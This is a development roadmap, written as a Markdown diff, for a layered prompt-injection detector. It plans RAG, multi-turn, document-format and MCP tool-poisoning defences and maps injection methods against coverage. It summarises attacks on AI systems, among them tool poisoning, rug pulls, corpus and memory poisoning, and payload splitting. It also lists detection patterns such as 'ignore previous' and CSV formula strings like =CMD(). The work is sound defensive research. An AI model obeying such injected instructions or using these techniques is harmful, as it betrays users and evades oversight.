+- [ ] **Integration tests** — End-to-end: input → L0 → L1 → L2 → L4 → L6 → verdict. **Priority**: P1. **Effort**: 4-6 hours.
+- [ ] **Regression dashboard** — Track detection rates, FPR, latency over time. **Priority**: P1.
+- [ ] **Per-technique attribution metrics** — Track `attribution_correct` flag and confusion pairs per technique_id. Enables identifying which techniques generate FPs (e.g., D3.4 markdown vs benign markdown) and which get misclassified as other techniques. **Priority**: P1. **Effort**: Medium.
+- [x] **Property-based testing (Hypothesis)** — DONE (2026-02-14): `test_layer0_hypothesis.py` with 40 property-based tests. Full Unicode/bytes fuzzing of L0. Found surrogate crash bug. **Priority**: P1.
+- [ ] **Garak integration** — Run adversarial probes against detector. **Priority**: P2.
+- [ ] **PyRIT integration** — Microsoft red-teaming framework. **Priority**: P2.
+- [ ] **Docker containerization** — Reproducible training/evaluation. **Priority**: P2.
+
+#### REMAINING (From original roadmap)
+- [x] **CI/CD pipeline** — DONE (2026-02-14): GitHub Actions CI with Python 3.9-3.12 matrix, flake8 linting, coverage, PR checks. **Priority**: P0.
+- [ ] **Rainbow Teaming** — Automated adversarial generation. **Priority**: P2.
+
+#### HOUSEKEEPING (Cross-cutting quality items — no single layer owner)
+- [ ] **Central config file** — Extract all hardcoded magic numbers (thresholds, weights, limits, TF-IDF params) into a single `config.py` or `config.yaml`. Currently scattered across predict.py (0.55, 0.6, 0.15, 0.3, 0.8), features.py (5000), model.py (10000), cascade.py, llm_judge.py. **Priority**: P1. **Effort**: 4-6 hours.
+- [ ] **Structured logging framework** — Replace all debug `print()` statements across the codebase with Python `logging` module. Configure per-module log levels, structured JSON output for production, human-readable for dev. Cover: predict.py, cascade.py, llm_judge.py, obfuscation.py, layer0/, output_scanner.py. **Priority**: P1. **Effort**: 4-6 hours.
+- [ ] **Update README.md** — Document the actual 20-layer architecture, Layer 0 pipeline, taxonomy system (19 categories, 103+ techniques), probe framework (Probe base class, expand(), buffs), evaluation harness, and setup instructions. **Priority**: P1. **Effort**: 4-6 hours.
+
+### Implementation Plan
+**Phase 1 (P0)**: GitHub Actions CI (tests + lint + security), pre-commit hooks
+**Phase 2 (P1)**: pyproject.toml, Makefile, integration tests, regression dashboard, Hypothesis, central config, structured logging, README
+**Phase 3 (P2)**: Garak/PyRIT, Docker, Rainbow Teaming
+
+---
+
+## Layer 15: Threat Intelligence Sync
+
+**Files**: `scripts/sync_datasets.py` (partial — syncs data but no threat intel feeds), `data/datasets.yaml` (11 sources), `data/taxonomy.yaml`, `data/tags.misp.tsv`
+**Tests**: None
+**Status**: **NOT implemented** — static taxonomy only, zero automated feeds
+
+### Updated Description
+Layer 15 should provide automated synchronization with external threat intelligence sources to keep the detector current with evolving attack techniques. Currently, the project has static references to OWASP-LLM, AVID, and LMRC taxonomies in `taxonomy.yaml` and `tags.misp.tsv`, and `sync_datasets.py` can download 11 external datasets (3 GitHub CSVs + 8 HuggingFace repos) with SHA-256 freshness checking. However, there is **zero automated update mechanism** — no cron jobs, no GitHub Actions, no API clients for any threat intel source. Dataset staleness is a systemic risk as the threat landscape evolves weekly.
+
+### TODO List
+
+#### DONE
+- [x] Static taxonomy mappings: OWASP-LLM 2025, AVID, LMRC Risk Cards — `data/tags.misp.tsv`
+- [x] 11 external dataset sources registered in `data/datasets.yaml`
+- [x] `sync_datasets.py` with SHA-256 freshness checking and lock file — `scripts/`
+- [x] Manual dataset download with `--force` option
+
+#### NEW (All items are new — layer not yet implemented)
+- [ ] **MITRE ATLAS YAML sync** — Monitor ATLAS GitHub repo for new techniques, auto-map to local taxonomy. **Priority**: P0.
+- [ ] **Garak probe monitoring** — Track leondz/garak GitHub releases for new probe categories. Auto-generate corresponding local probes. **Priority**: P0.
+- [ ] **AIID GraphQL polling** — Query incidentdatabase.ai for new AI incidents, extract attack patterns for taxonomy expansion. **Priority**: P1.
+- [ ] **JailbreakBench/HarmBench sync** — Auto-download new benchmark datasets for cross-validation. **Priority**: P1.
+- [ ] **OWASP LLM Top 10 monitoring** — Detect annual taxonomy revisions, alert on changes. **Priority**: P1.
+- [ ] **GitHub Actions weekly sync** — Scheduled workflow: sync datasets → generate samples → run evaluate_probes → report detection rate changes. **Priority**: P0.
+- [ ] **Taxonomy diff detection** — Compare old vs new taxonomy versions, highlight new techniques, deprecated ones, reclassifications. **Priority**: P1.
+- [ ] **Incident-to-sample pipeline** — Convert real-world incident reports (AIID) into training samples. **Priority**: P2.
+- [ ] **Add SafetyPrompts.com monitoring** — Living catalogue of 144+ prompt injection datasets. Monitor for new dataset additions. Source: Automation gap #60. **Priority**: P1.
+- [ ] **Add TAP/PAIR automated red teaming** — Tree of Attacks with Pruning (TAP) and Prompt Automatic Iterative Refinement (PAIR) alongside Rainbow Teaming. Source: Automation gap #61. **Priority**: P2.
+
+### Implementation Plan
+**Phase 1 (P0)**: GitHub Actions weekly sync workflow, MITRE ATLAS monitoring, Garak probe tracking
+**Phase 2 (P1)**: AIID polling, JailbreakBench sync, taxonomy diff detection, OWASP monitoring, SafetyPrompts.com monitoring
+**Phase 3 (P2)**: Incident-to-sample pipeline, TAP/PAIR red teaming, cross-benchmark validation dashboards
+
+---
+
+## Layer 16: Multi-Turn Detection
+
+**Files**: None
+**Tests**: None
+**Status**: **NOT implemented** — detector is 100% stateless
+
+### Updated Description
+Layer 16 should provide conversation-level detection for multi-turn attacks that spread payloads across multiple messages. Currently, the detector is completely stateless — every call to `scan()`, `predict()`, or `cascade.classify()` treats input as isolated with zero memory of previous interactions. The taxonomy defines D7.2 (Multi-turn-splitting) and C1.1 (Gradual escalation) as HIGH severity techniques, but they have ZERO detection capability. The `multimodal_injection.py` probe generates text simulations of multi-turn attacks for ML training, but no runtime state management exists.
+
+### TODO List
+
+#### DONE
+- [x] D7.2 (Multi-turn-splitting) defined in taxonomy.yaml with severity: high
+- [x] C1.1 (Gradual escalation) defined with multi-turn test samples (text simulations)
+- [x] `payload_delivery.py` probe generates D7.2 simulated samples — `scripts/taxonomy/`
+
+#### NEW (All items are new — layer not yet implemented)
+- [ ] **Create `ConversationSecurityMonitor`** — Multi-turn analysis: escalation detection, memory write attempts, trigger planting, fabricated history, false prior context claims. New file: `src/conversation_monitor.py`. Source: IM0015-16 Coverage Gap #11. **Priority**: P1. **Effort**: High.
+- [ ] **Build fabricated history detector** — Detect pasted/fabricated conversation history (6+ turn markers or "conversation history/log/transcript" preamble). Source: IM0015-16 Coverage Gap #23. **Priority**: P2.
+- [ ] **Implement cross-session injection correlation** — Attack pattern tracking across sessions. Source: IM0015-16 Coverage Gap #32. **Priority**: P3.
+- [ ] **ConversationState class** — Store turn history, cumulative risk scores, active flags per session. **Priority**: P1. **Effort**: Medium.
+- [ ] **SessionManager** — Create/update/expire sessions. In-memory for POC, Redis/SQLite for production. **Priority**: P1. **Effort**: Medium.
+- [ ] **Turn-level analysis** — Analyze sequential patterns: risk escalation, topic drift, payload assembly across turns. **Priority**: P1.
+- [ ] **Sliding window** — Configurable N-turn window (default 10) for context accumulation. **Priority**: P1.
+- [ ] **Gradual escalation detection (C1.1)** — Track risk_score trend across turns. Alert on monotonic increase pattern. **Priority**: P1.
+- [ ] **Payload splitting detection (D7.2)** — Concatenate recent turns, re-analyze combined text. Detect when fragments assemble into attack. **Priority**: P1.
+- [ ] **Context poisoning detection (D1.20)** — Detect when early turns inject misleading context exploited later. **Priority**: P2.
+- [ ] **Cross-turn embedding similarity** — Detect semantic drift or sudden topic shifts indicating manipulation. **Priority**: P2.
+- [ ] **Session storage backend** — SQLite for single-instance, Redis for distributed deployments. **Priority**: P1.
+- [ ] **TTL and cleanup** — Auto-expire sessions after inactivity (default 30 min). **Priority**: P1.
+- [ ] **Multi-turn test framework** — Sequential input test harness for conversation-level testing. **Priority**: P1.
+
+### Implementation Plan
+**Phase 1 (P1 — POC)**: ConversationState + SessionManager with in-memory storage, sliding window, basic escalation detection
+**Phase 2 (P1 — Core)**: D7.2 payload splitting, C1.1 gradual escalation, TTL cleanup, multi-turn test framework
+**Phase 3 (P2 — Advanced)**: Redis backend, cross-turn embeddings, context poisoning, temporal features
+
+---
+
+## Coverage Matrix
+
+Maps the 17 known injection method classes (IM0001–IM0017) against our detection stack to identify systemic gaps.
+
+| IM Code | Injection Method | Status | Our Coverage |
+| --- | --- | --- | --- |
+| **IM0001** | Direct Prompt Injection | **YES** | D1-D8 (103+ techniques), rules.py, layer0, cascade, probes |
+| **IM0002** | Prompt Body Injection | **YES** | D3.4 markdown delimiters, D7.3 code-block hiding, HTML extractor |
+| **IM0003** | Attached Data Injection | **PARTIAL** | M1.4 PDF hidden text, M1.5 SVG injection, magic byte detection. Gap: no OCR/audio |
+| **IM0004** | Indirect PI (User-Prompt) | **NO** | Not modeled — social engineering delivery vector |
+| **IM0005** | Unwitting User Delivery | **NO** | Not modeled — user tricked into submitting payload |
+| **IM0006** | LLM-Generated Delivery | **PARTIAL** | output_scanner.py detects compromised output. Gap: no cross-LLM propagation tracking |
+| **IM0007** | Altered Prompt Delivery | **PARTIAL** | D8 context manipulation, D7.2 multi-turn splitting. Gap: no middleware tampering. New: Category AD (Task #62) adds 19 techniques (AD1 infra, AD2 supply chain, AD3 defense) |
+| **IM0008** | Indirect PI (Context-Data) | **PARTIAL** | I1 (100+ samples), I2 HTML injection, html_extractor.py. Gap: email signature hiding (I1.7), broad-distribution documents (I1.8) |
+| **IM0009** | Internal Context-Data | **YES** | I1.2 document poisoning, I1.4 database/knowledge-base poisoning |
+| **IM0010** | External Context-Data | **YES** | I1.1 web pages, I1.3 email, RSS/API feeds |
+| **IM0011** | Attacker-Owned External | **YES** | I1.1 attacker-controlled websites, webhooks, APIs |
+| **IM0012** | Attacker-Compromised External | **YES** | I1.1 compromised GitHub, Stack Overflow, npm packages |
+| **IM0013** | Attacker-Influenced External | **YES** | I1.1 Yelp reviews, Reddit comments, wiki edits |
+| **IM0014** | Compromised Ingestion Process | **PARTIAL** | S1.3-S1.5 documented in taxonomy. Gap: no detection or samples |
+| **IM0015** | Prior-LLM-Output Injection | **PARTIAL** | D1.20 context-memory-poisoning defined. Gap: no trained samples |
+| **IM0016** | Agent Memory Injection | **PARTIAL** | I1.4 cached/embeddings DB poisoning. Gap: no explicit agent memory attacks |
+| **IM0017** | Agent-to-Agent Injection | **NO** | T1.3 tool chaining exists. Gap: no multi-agent propagation model |
+
+**Summary**: 7 YES, 7 PARTIAL, 3 NO. Primary gaps: multimodal (OCR/audio), cross-LLM propagation, middleware tampering, ingestion pipeline, agent memory, multi-agent attacks, email signature hiding, and broad-distribution injection vectors.
+
+---
+
+## Implementation Reference
+
+Cross-cutting structural guidance for Coverage Gap tasks (now folded into their respective layer sections L0-L20).
+
+### Sprint Structure
+
+| Sprint | Focus | Layers | Dependencies |
+| --- | --- | --- | --- |
+| 1 | Taxonomy Foundation | L12 | None — must complete first |
+| 2 | Security Hardening | L1, L7, L9 | None |
+| 3 | Multi-Turn & Pipeline | L6, L9, L16, L18, L19 | Task 7 before Task 10 |
+| 4 | Document Formats | L0, L17 | None |
+| 5 | Integrity & Verification | L10, L16 | None |
+| 6 | Sample Generation | L12 | Sprint 1 (taxonomy IDs must exist) |
+| 7 | Future/P3 | L16, L17, L18, L19 | Sprints 1-4 |
+
+### Key Patterns to Reuse
+
+| Pattern | Source File |
+| --- | --- |
+| Scanner result dataclass | `src/output_scanner.py:26-33` |
+| Scanner `scan()` interface | `src/output_scanner.py` |
+| Probe base class | `scripts/taxonomy/_base.py` |
+| Template expansion | `scripts/taxonomy/_core.py:expand()` |
+| ClassifierOutput contract | `scripts/taxonomy/_base.py` |
+| Layer 0 result pattern | `src/layer0/result.py` |
+
+### Verification Plan (run after each sprint)
+
+1. Taxonomy YAML validation: `python -c "import yaml; yaml.safe_load(open('data/taxonomy.yaml'))"`
+2. Unit tests: `python -m unittest discover -s tests -p 'test_*.py'`
+3. Integration tests: `python scripts/integration_test.py` (after Sprint 3+)
+4. Probe evaluation: `python scripts/evaluate_probes.py --taxonomy all --json` — target >=85% recall, <5% FPR
+5. Human review gate — all taxonomy changes require manual PR approval
+6. Merge to main
+
+### Automation Pipeline Architecture
+
+```
+ATLAS YAML sync (weekly)  ─┐
+Garak probe monitor        ├─► Candidate Queue ─► Validation Pipeline ─► Auto-PR (human gate)
+AIID GraphQL polling        │     (staging)         │
+Rainbow Teaming (monthly)  ┘                        │
+TAP/PAIR (on-demand)       ─┘                        ├─ LLM classifier assigns taxonomy category
+SafetyPrompts.com monitor ─┘                        ├─ Dedup check against existing samples
+                                                     ├─ Verify attack works (classify → detected)
+                                                     ├─ Generate benign counterpart
+                                                     └─ Human review gate → merge
+```
+
+**CRITICAL: Always Human-Gate Taxonomy Changes.** No auto-merge for taxonomy entries. All auto-generated PRs must include full context (source, technique ID, sample text, classification result) for human approval.
+
+### Key Research Papers
+
+| Paper | arXiv | Impact |
+| --- | --- | --- |
+| Morris II AI Worm | 2403.02817 | Self-replicating prompts, zero-click propagation, Virtual Donkey defense |
+| PoisonedRAG | 2402.07867 | 90% attack success with only 5 injected texts |
+| AgentPoison | 2407.12784 | Backdoor attacks on LLM agent memory, 80%+ success |
+| INSEC (Code Completion Attack) | 2408.02509 | 50%+ increase in insecure code via comment injection |
+| Multi-AudioJail | 2504.01094 | 3.1x higher success than text-only attacks |
+| SoundBreak | 2601.16231 | 96% attack success on audio-video-language models |
+| AgentTypo (Typographic Attacks) | 2510.04257 | 0.68 combined ASR on GPT-4o |
+| Corpus Poisoning | 2310.19156 | Adversarial passage injection into retrieval corpora |
+
+### File Summary
+
+18 new `src/` files, 14 new test files, 4 new probe files, 0 new heavy dependencies (all stdlib + existing deps).
+
+---
+
+## Layer 17: Document Format Scanning (NEW)
+
+**Files**: None (new layer)
+**Tests**: None
+**Status**: **NOT implemented** — documents parsed only as plain text
+
+### Updated Description
+Layer 17 scans structured document formats (PDF, DOCX/XLSX/PPTX, CSV, source code) for hidden prompt injections before they reach the LLM. Attackers embed invisible instructions in PDF hidden text layers, OOXML XML parts, CSV formula cells, and source code comments. This layer extracts all text (visible and hidden) from documents and runs it through the existing detection pipeline (L0→L1→L2→L4). Research shows PDF invisible text exploits (Snyk 2025), OOXML steganography (IEEE 2025), CSV formula injection in LLM context, and code comment injection (CVE-2025-53773, CVSS 9.6 against GitHub Copilot).
+
+### TODO List
+
+#### DONE
+- (nothing — layer is new)
+
+#### NEW (All items are new)
+- [ ] **Add DOCX/XLSX scanning** — Parse ZIP+XML to extract metadata, comments, track changes, hidden sheets; scan all fields for injection patterns. Source: IM0003 Coverage Gap #15. **Priority**: P1. **Effort**: Medium.
+- [ ] **Add CSV injection detection** — Formula injection (`=CMD()`, `=SYSTEM()`), comment injection, delimiter confusion. Source: IM0003 Coverage Gap #16. **Priority**: P1. **Effort**: Easy.
+- [ ] **Add code comment scanning** — Extract comments/docstrings from Python, JS, HTML, YAML; scan for injection payloads (INSEC attack vector, arXiv:2408.02509). Source: IM0003 Coverage Gap #17. **Priority**: P1. **Effort**: Medium.
+- [ ] **Integrate OCR** for image text extraction — pytesseract; detect tiny/invisible text (font height < 5px). Source: IM0003 Coverage Gap #25. **Priority**: P2.
+- [ ] **Add image metadata extraction** — EXIF/IPTC/XMP via Pillow; scan for injection payloads. Source: IM0003 Coverage Gap #26. **Priority**: P2.
+- [ ] **Integrate Whisper** for audio transcription analysis — adversarial prefix detection, special token exploitation. Source: IM0003 Coverage Gap #27. **Priority**: P3.
+- [ ] **Add adversarial image perturbation detection** — Bagdasaryan et al., arXiv:2307.10490. Source: Coverage Gap #28. **Priority**: P3.
+- [ ] **Add typographic attack detection** — OCR + layout analysis (19+ papers, ECCV 2024). Source: Coverage Gap #29. **Priority**: P3.
+- [ ] **Add QR/barcode decoding** — pyzbar integration. Source: IM0003 Coverage Gap #31. **Priority**: P3.
+**P1 — High impact, moderate effort:**
+- [ ] **PDFScanner** — Extract ALL text layers (visible + invisible/white-on-white) using `pdfminer.six` or `PyMuPDF`. Parse metadata fields and annotations. Check for text-color matches with background. Run extracted text through injection detector. **Effort**: Medium.
+- [ ] **OOXMLScanner** — Unzip OOXML archives (.docx, .xlsx, .pptx), parse all XML parts (not just main document). Check for hidden text (white font, font-size:1, hidden XML attributes). Extract comments, tracked changes, footnotes, headers/footers. Scan all extracted text. **Effort**: Medium.
+- [ ] **CSVScanner** — Check for formula-prefix characters (`=`, `+`, `-`, `@`, `\t`, `\r`) in cells. Scan cell contents for injection patterns. Flag cells with excessive length or unusual encoding. Strip/escape formula prefixes before LLM ingestion. **Effort**: Easy.
+- [ ] **CodeCommentScanner** — Extract comments from source files (Python `#`, JS `//`, `/* */`, HTML `<!-- -->`). Scan comments for instruction-like language patterns. Addresses CVE-2025-53773. **Effort**: Easy-Medium.
+
+**P2 — Heavier dependencies:**
+- [ ] **RTF/legacy format scanner** — Parse RTF control words for hidden text. **Effort**: Medium.
+- [ ] **Email (.eml/.msg) scanner** — Parse MIME parts, extract text from HTML and attachments. **Effort**: Medium.
+- [ ] **SVG scanner** — Parse SVG XML for embedded text, scripts, and foreignObject content. **Effort**: Easy.
+- [ ] **LSB steganography detection (M1.2)** — Check least-significant bits in images for hidden data. **Priority**: P2.
+- [ ] **Microsoft MarkItDown** — Unified parser for PDF/DOCX/PPTX/XLSX as alternative to individual scanners. **Priority**: P2.
+
+**P3 — Research-dependent:**
+- [ ] **Font-based attacks** — Detect invisible/near-invisible text via font manipulation (white-on-white, font-size:1px, zero-width fonts). **Priority**: P3.
+- [ ] **Visual prompt injection detection (CLIP)** — Use CLIP or similar vision-language model to detect text-in-image injection. **Priority**: P3.
+
+### Implementation Plan
+**Phase 1 (P1)**: PDFScanner + OOXMLScanner + CSVScanner + CodeCommentScanner
+**Phase 2 (P2)**: RTF, email, SVG scanners, LSB stego, MarkItDown, adversarial document generation for testing
+**Phase 3 (P3)**: Font-based attacks, visual prompt injection (CLIP), adversarial OCR robustness
+
+---
+
+## Layer 18: RAG Security / Ingestion Validation (NEW)
+
+**Files**: None (new layer)
+**Tests**: None
+**Status**: **NOT implemented** — no RAG-specific defenses
+
+### Updated Description
+Layer 18 protects Retrieval-Augmented Generation (RAG) systems from knowledge corruption, embedding manipulation, and indirect prompt injection via ingested documents. Research shows PoisonedRAG (USENIX Security 2025) achieves 90% attack success with just 5 malicious texts in a million-text database. Embedding space manipulation (OWASP LLM08:2025) enables vector collision attacks that hijack nearest-neighbor retrieval. Defense requires pre-indexing injection scanning, embedding anomaly detection, provenance tracking, and retrieval pattern monitoring.
+
+### TODO List
+
+#### DONE
+- (nothing — layer is new)
+
+#### NEW (All items are new)
+- [ ] **Create `IngestionValidator`** — Pre-ingestion document scanning for injection patterns, hidden content, Unicode anomalies, metadata injection; ML classifier integration. New file: `src/ingestion_validator.py`. Source: IM0014 Coverage Gap #12. **Priority**: P1. **Effort**: High.
+- [ ] **Create `ChunkValidator`** — Per-chunk validation: instruction keyword density, imperative sentence ratio, semantic coherence checks. New file: `src/chunk_validator.py`. Source: IM0014 Coverage Gap #13. **Priority**: P1. **Effort**: Medium.
+- [ ] **Create `EmbeddingIntegrityChecker`** — Embedding norm anomaly detection, text-embedding coherence verification, isolation score. Source: IM0014 Coverage Gap #18. **Priority**: P2. **Effort**: Medium.
+- [ ] **Create `VectorDBSanitizer`** — Pre-embedding sanitization, retrieval-time risk scoring. Source: IM0015-16 Coverage Gap #19. **Priority**: P2. **Effort**: Medium.
+- [ ] **Build visual document RAG poisoning detection** — Shereen et al., arXiv:2504.02132. Source: IM0003 Coverage Gap #30. **Priority**: P3.
+**P1 — Core RAG defenses:**
+- [ ] **IngestionValidator** — Scan ALL incoming documents through injection detector (L0→L4) before indexing into vector store. Reject or quarantine flagged documents. **Priority**: P1. **Effort**: Medium.
+- [ ] **ChunkValidator** — Compute perplexity AND semantic coherence scores per chunk. Flag chunks whose embeddings are anomalously close to known-harmful prompt embeddings. **Priority**: P1. **Effort**: Medium.
+- [ ] **Provenance tracking** — Cryptographic hashes linking chunks to source documents. Source trust scoring (internal docs > web scrapes > user uploads). **Priority**: P1. **Effort**: Medium.
+- [ ] **Retrieval pattern monitoring** — Flag repeated access to specific embeddings. Detect query patterns that systematically probe for poisoned content. **Priority**: P1. **Effort**: Medium.
+
+**P2 — Advanced RAG security:**
+- [ ] **Embedding drift detection** — Maintain "known-good" baseline embedding distribution. Flag outliers that may indicate poisoning. **Priority**: P2. **Effort**: Medium.
+- [ ] **Multi-tenant isolation** — Separate embedding spaces per tenant to prevent cross-contamination. **Priority**: P2. **Effort**: High.
+- [ ] **NeMo Guardrails integration** — Study NVIDIA NeMo retrieval rails architecture. Consider Jailbreak Detection NIM as secondary validation. **Priority**: P2.
+- [ ] **Query sanitization** — Run user queries through injection detector before retrieval to prevent query manipulation attacks. **Priority**: P1. **Effort**: Easy.
+
+### Implementation Plan
+**Phase 1 (P1)**: IngestionValidator + ChunkValidator + provenance tracking + query sanitization
+**Phase 2 (P2)**: Embedding drift detection, retrieval monitoring, multi-tenant isolation, NeMo integration
+
+---
+
+## Layer 19: Agent / MCP Security (NEW)
+
+**Files**: None (new layer)
+**Tests**: None
+**Status**: **NOT implemented** — no agent or MCP-specific defenses
+
+### Updated Description
+Layer 19 defends against attacks targeting AI agent architectures and Model Context Protocol (MCP) tool ecosystems. Research documents critical vulnerabilities: MCP Tool Poisoning Attacks (TPA) embed malicious instructions in tool descriptions invisible to users (Elastic Security Labs 2025); Rug Pull attacks silently modify tool definitions post-approval (MCPManager 2025); CVE-2025-6514 enables OS command injection via mcp-remote; and Google A2A protocol has documented JWT, SSRF, and Agent Card spoofing vulnerabilities. Defense requires tool description scanning, definition integrity monitoring, and parameter validation.
+
+### TODO List
+
+#### DONE
+- (nothing — layer is new)
+
+#### NEW (All items are new)
+- [ ] **Create `MCPToolPoisonDetector`** — Scan MCP tool descriptions and responses for hidden instructions, HTML comments, invisible text, rug-pull detection via hash comparison. New file: `src/mcp_detector.py`. Source: IM0007 Coverage Gap #14. **Priority**: P1. **Effort**: Medium.
+- [ ] **Build agent communication interceptor** for LangChain/AutoGen/CrewAI — Validate agent-to-agent messages. Source: IM0006 Coverage Gap #33. **Priority**: P3.
+- [ ] **Build MCP response scanning middleware** — Security middleware for MCP pipeline. Source: IM0006/IM0007 Coverage Gap #34. **Priority**: P3.
+**P1 — Core agent/MCP defenses:**
+- [ ] **MCPToolPoisonDetector** — Parse ALL tool descriptions and code comments for injection patterns. Compare descriptions against known-good baseline (detect mutations). Flag instruction-like language ("ignore previous", "always call", "before responding"). Implement description hash verification. **Priority**: P1. **Effort**: Medium.
+- [ ] **ToolDefinitionIntegrityMonitor** — Hash tool definitions at approval time. Verify hash on every invocation. Block execution if definition changed. Log all definition mutations with diff analysis. Addresses rug pull attacks. **Priority**: P1. **Effort**: Medium.
+- [ ] **ToolParameterValidator** — Detect shell metacharacters in MCP tool parameters. Check for path traversal/symlink patterns in file-access tools. Detect SQL injection in tools accepting user-controlled input. **Priority**: P1. **Effort**: Medium.
+- [ ] **CVE-to-detection-rule mapping** — Maintain mapping of MCP-specific CVEs (CVE-2025-6514 etc.) to detection rules. **Priority**: P1. **Effort**: Easy.
+
+**P2 — Advanced agent security:**
+- [ ] **ETDI pattern adoption** — Require tool definition signatures (digital signing). Enforce permission scopes (OAuth 2.0). Context-aware authorization (Cedar policies). Full audit logging. **Priority**: P2. **Effort**: High.
+- [ ] **A2A protocol validation** — Strict token expiration, single-use transaction tokens, Agent Card signature verification, JSON payload size/depth limits, webhook URL allowlisting. **Priority**: P2. **Effort**: High.
+- [ ] **Multi-agent chain monitoring** — Track tool call chains across agents. Detect privilege escalation patterns. Flag when agent output is consumed by another agent without sanitization. **Priority**: P2. **Effort**: High.
+- [ ] **MCPGuard integration** — Study MCPGuard's modular detection architecture (input scanner → policy engine → output scanner) for reference implementation. **Priority**: P2.
+
+### Implementation Plan
+**Phase 1 (P1)**: MCPToolPoisonDetector + ToolDefinitionIntegrityMonitor + ToolParameterValidator + CVE mapping
+**Phase 2 (P2)**: ETDI signing, A2A validation, multi-agent chain monitoring, MCPGuard integration
+
+---
+
+## Layer 20: Taxonomy Automation Pipeline (NEW)
+
+**Files**: `data/taxonomy.yaml`, `data/tags.misp.tsv`, `scripts/generate_taxonomy_samples.py`
+**Tests**: None (for automation components)
+**Status**: **NOT implemented** — taxonomy is manually curated
+
+### Updated Description
+Layer 20 automates the lifecycle of the threat taxonomy: syncing with external sources, detecting new techniques, generating probe samples, and validating coverage. Currently the taxonomy is manually maintained in `taxonomy.yaml` with 19 categories and 103+ techniques. Research shows MITRE ATLAS v4.4.0 uses auto-generated YAML with JSON Schema validation; Promptfoo maps 50+ vulnerability types to automated test generation; and NLP-based taxonomy generation (Springer 2025 survey) can cluster threat reports into new categories. The goal is a closed-loop pipeline: external feeds → taxonomy update → probe generation → evaluation → coverage report.
+
+### TODO List
+
+#### DONE
+- [x] Static taxonomy: 19 categories, 103+ techniques in `taxonomy.yaml`
+- [x] MISP tag mappings: OWASP-LLM, AVID, LMRC in `tags.misp.tsv`
+- [x] Probe-based sample generation from taxonomy — `generate_taxonomy_samples.py`
+
+#### NEW (All items are new)
+**P0 — Critical automation:**
+- [ ] **TaxonomySyncPipeline** — Fetch latest MITRE ATLAS release, diff techniques against local taxonomy, generate candidate entries for unmapped techniques, flag for human review. **Priority**: P0. **Effort**: Medium.
+- [ ] **Promptfoo taxonomy mapping** — Map all 103+ techniques to Promptfoo plugin configs. YAML config generating adversarial test cases per category. Run against detector as CI/CD red-team step. **Priority**: P0. **Effort**: Medium.
+
+**P1 — Core automation:**
+- [ ] **ATLAS technique ID mapping** — Create `data/atlas_mapping.yaml` mapping each technique to MITRE ATLAS IDs. Enable cross-referencing with ATLAS-aware tooling. **Priority**: P1. **Effort**: Easy.
+- [ ] **Taxonomy diff detection** — Compare old vs new taxonomy versions. Highlight new techniques, deprecated ones, reclassifications. Generate changelog. **Priority**: P1. **Effort**: Easy.
+- [ ] **Coverage report automation** — After each evaluation run, generate per-technique detection rate report. Flag techniques below threshold. **Priority**: P1. **Effort**: Easy.
+- [ ] **External benchmark cross-reference** — Cross-reference taxonomy against arXiv 2511.21901 unified taxonomy (validated against 133 incidents, 100% classification coverage). Identify gaps. **Priority**: P1. **Effort**: Medium.
+
+**P2 — Advanced automation:**
+- [ ] **NLP-based category proposal** — Embed new threat reports, find nearest existing category. If distance > threshold, propose new category. Uses clustering on threat intelligence text. **Priority**: P2. **Effort**: High.
+- [ ] **MAESTRO agentic threat mapping** — Incorporate OWASP MAESTRO threat categories for agent-specific attack patterns. **Priority**: P2. **Effort**: Medium.
+- [ ] **Incident-to-sample pipeline** — Convert AIID real-world incident reports into training samples automatically. **Priority**: P2. **Effort**: High.
+
+### Implementation Plan
+**Phase 1 (P0)**: TaxonomySyncPipeline + Promptfoo mapping
+**Phase 2 (P1)**: ATLAS mapping, diff detection, coverage reports, benchmark cross-reference
+**Phase 3 (P2)**: NLP-based proposals, MAESTRO mapping, incident-to-sample pipeline
+
+
+---
+
+## Key Libraries (Research-Sourced)
+
+| Library | Purpose | Layer |
+|---------|---------|-------|
+| ftfy | Mojibake repair | L0 |
+| confusable_homoglyphs | Cyrillic/Greek mapping | L0 |
+| google-re2 | Linear-time regex | L1 |
+| yara-python | Multi-pattern rules | L1 |
+| iocextract | IOC extraction | L1 |
+| presidio-analyzer | PII detection | L9 |
+| model-signing | Sigstore signing v1.0 | L11 |
+| modelscan | Pickle content scanning | L11 |
+| pip-audit | Dependency scanning | L11 |
+| cyclonedx-bom | SBOM generation | L11 |
+| safetensors | Secure model format | L11 |
+| pdfminer.six | PDF text extraction | L17 |
+| promptfoo | Red-team framework | L14 |
+| garak | LLM vuln scanner | L14 |
+| langfuse | LLM observability | L16 |
+| hypothesis | Fuzz testing | L0/L14 |
+| dvc | Data versioning | L13 |
+
+## Top 30 Research Sources (2024-2026)
+
+1. PIGuard (ACL 2025) — Sequence labeling, 30.8% over-defense reduction
+2. PromptArmor — Sub-1% FPR/FNR via patterns + LLM fallback
+3. PoisonedRAG (USENIX Security 2025) — 5 texts poison 1M DB, 90% ASR
+4. FlipAttack — Bit-level Unicode, 98% ASR vs Claude/GPT
+5. M2S (ACL 2025) — Flattening defense, 70-96% detection
+6. Crescendo (USENIX Security 2025) — Gradual escalation multi-turn
+7. JudgeDeceiver — Meta-injection on LLM-as-judge
+8. Spotlighting (Microsoft) — Sub-2% attack success
+9. PickleBall (CCS 2025) — Restricted unpickler
+10. Sigstore Model Signing v1.0 (OpenSSF/NVIDIA)
+11. NVIDIA Garak — Leading LLM vulnerability scanner
+12. Microsoft PyRIT — 100+ internal red-team ops
+13. HackAPrompt (EMNLP 2023) — 600K prompts, 29 techniques
+14. LLMail-Inject (Microsoft 2024) — 208K adaptive submissions
+15. Tensor Trust (ICLR 2024) — 563K attacks + 118K defenses
+16. Rainbow Teaming (NeurIPS 2024) — Quality-diversity, 90%+ ASR
+17. MITRE ATLAS v4.4.0 — 15 tactics, 66 techniques
+18. OWASP LLM Top 10 2025 — Prompt Injection #1
+19. Meta CyberSecEval 4 — Comprehensive LLM security benchmark
+20. MCPGuard — Automated MCP vulnerability detection
+21. ETDI — Enhanced Tool Definition Interface for MCP
+22. EmbedGuard — Embedding defense with provenance
+23. NeMo Guardrails (NVIDIA) — Retrieval rails + Jailbreak NIM
+24. ProtectAI DeBERTa v2 — 99.93% accuracy classifier
+25. OpenSSF MLSecOps (Aug 2025) — ML pipeline security guide
+26. Thinkst Canarytokens — Industry-standard honeytokens
+27. Rebuff (ProtectAI) — Multi-layer defense framework
+28. ModelScan (ProtectAI) — 400K+ models scanned
+29. SLSA v1.1 (Apr 2025) — Supply-chain provenance levels
